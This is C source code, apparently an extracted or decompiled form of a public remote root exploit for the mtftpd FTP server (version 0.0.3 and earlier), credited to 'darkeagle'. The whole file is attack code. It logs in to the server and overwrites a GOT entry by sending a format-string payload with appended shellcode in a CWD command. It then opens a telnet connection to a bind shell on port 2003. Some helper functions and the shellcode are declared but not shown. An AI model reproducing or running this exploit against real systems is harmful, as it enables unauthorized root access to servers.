
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int recva ;
typedef int final ;


 int AF_INET ;
 char EOF ;
 int GOT_ADDR ;
 int IPPROTO_IP ;
 int PORT ;
 int RETADDR ;
 int SOCK_STREAM ;
 char* build_un (unsigned long,unsigned int,unsigned int,int) ;
 int connect (int,struct sockaddr*,int) ;
 int doit (unsigned char,unsigned char,unsigned char,unsigned char,unsigned long) ;
 int exit (int) ;
 int fprintf (int ,char*,int) ;
 char getopt (int,char**,char*) ;
 int htons (int ) ;
 int inet_addr (char*) ;
 scalar_t__ malloc (int) ;
 int memset (char*,int,int) ;
 char* optarg ;
 int printf (char*,...) ;
 int recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 char* shellcode ;
 int sleep (int) ;
 int snprintf (char*,int,char*,...) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*) ;
 int stderr ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 scalar_t__ strstr (char*,char*) ;
 int strtoul (char*,int *,int ) ;
 int system (char*) ;
 int usage (char*) ;

int
main( int argc, char * argv[] )
{
  char opt;
  char * fmt;
  char * endian;
  unsigned long locaddr, retaddr;
  unsigned int offset, base, align = 0;
  unsigned char b0, b1, b2, b3;
  int length, ch;
  char *username = ((void*)0);
  char *password = ((void*)0), *ip = ((void*)0);
  char evil[3000];
  int f_got = 0;
  int f_retaddr = 0;
  char databuf[300];
  struct sockaddr_in final;
  int Socket;
  char exec[300];
  char recva[200];

if ( argc < 6 ) { usage(argv[0]); }
 printf("\n\nmtftpd <= 0.0.3 remote root exploit\n");
 printf("by darkeagle [http://unl0ck.org]\n");
while ((opt = getopt(argc, argv,"p:u:a:g:r:")) != EOF) {
  switch (opt) {
   case 'p':
    password = optarg;
    break;
   case 'a':
    ip = optarg;
    break;
   case 'g':
    f_got = strtoul(optarg,((void*)0),0);
    break;
   case 'r':
    f_retaddr = strtoul(optarg,((void*)0),0);
    break;
   case 'u':
    username = optarg;
    break;
   default:
    usage(argv[0]);
    break;
  }
 }

if ( f_got == 0 || f_retaddr == 0 )
{
 f_got = GOT_ADDR;
 f_retaddr = RETADDR;
}

printf("\n [`] GOT: 0x%x\n [`] Retaddr: 0x%x\n [`] Username: %s\n [`] Password: %s\n [`] IP: %s\n [`] Port: %d\n", f_got, f_retaddr, username, password, ip, 21);

printf(" [`] Creating SOCKET structure...\n");

final.sin_family = AF_INET;
final.sin_port = htons(PORT);
final.sin_addr.s_addr = inet_addr(ip);

Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

printf(" [+] Structure Done!\n");

printf(" [`] Connecting...\t");

if ( connect(Socket, (struct sockaddr*)&final, sizeof(final)) == -1 ) { printf("FAILED!\n"); exit(0); }

printf("OK!\n");

printf(" [+] Sending LOGIN DATA\n");

snprintf(databuf, 300, "USER %s\r\n\r\nPASS %s\r\n\r\n", username, password);

send(Socket, databuf, strlen(databuf), 0);
recv(Socket, recva, sizeof(recva), 0);

if ( strstr(recva, "230" ) ) { printf(" [+] Successfully logged!\n"); } else {
printf(" [-] Invalid login or password!\n\n");
exit(0); }

printf(" [`] Creating EviL Data...\t");
  length = ( sizeof( size_t ) * 16 ) + 1;

  if ( !(endian = (char *)malloc(length * sizeof(char))) ) {
    fprintf( stderr, "Can't allocate buffer (%d)\n", length );
    exit( -1 );
  }
  memset( endian, 0, length );

  ch = 0;
  locaddr = f_got;
  retaddr = f_retaddr;
  offset = 12;
  base = 4;


  doit( b0, b1, b2, b3, locaddr );

  if ( base%4 ) {
    align = 4 - ( base%4 );
    base += align;
  }

        strcat(endian, "U");

 snprintf( endian+strlen(endian), length,
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c",
              b3, b2, b1, b0,
              b3 + 1, b2, b1, b0,
              b3 + 2, b2, b1, b0,
              b3 + 3, b2, b1, b0 );

    fmt = build_un( retaddr, offset, base, 0xF + 0x1 );

    memset(fmt+strlen(fmt), 0x42, 48);
    strcat(fmt, shellcode);
    sprintf(evil, "CWD %s\r\n\r\n", fmt);

if ( strlen(evil) >= 256 ) { printf("FAILED!\n"); exit(0); }

 printf("OK!\n");
 printf(" [`] Sending...\t");
    send(Socket, evil, strlen(evil), 0);
printf("OK!\n");
sprintf(exec, "telnet %s 2003\n", ip);
printf(" [+] Connecting to shell...\t");
sleep(2);
system(exec);
printf("FAILED!\n\n");
return 0;
}
